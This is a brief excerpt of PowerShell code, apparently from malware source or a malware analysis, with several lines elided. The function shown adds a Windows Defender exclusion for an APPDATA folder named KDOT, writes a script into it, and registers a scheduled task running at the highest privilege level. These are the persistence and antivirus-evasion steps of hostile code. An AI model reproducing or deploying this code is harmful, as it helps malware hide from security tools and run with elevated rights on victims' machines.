...
function Invoke-TASKS {
    ...
    Add-MpPreference -ExclusionPath "$env:APPDATA\KDOT" | Out-Null
    New-Item -ItemType Directory -Path "$env:APPDATA\KDOT" -Force | Out-Null
    ...
    $inputstuff | Set-Content "$env:APPDATA\KDOT\KDOT.ps1" -Force | Out-Null
    ...
    Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "KDOT" -RunLevel Highest -Force | Out-Null
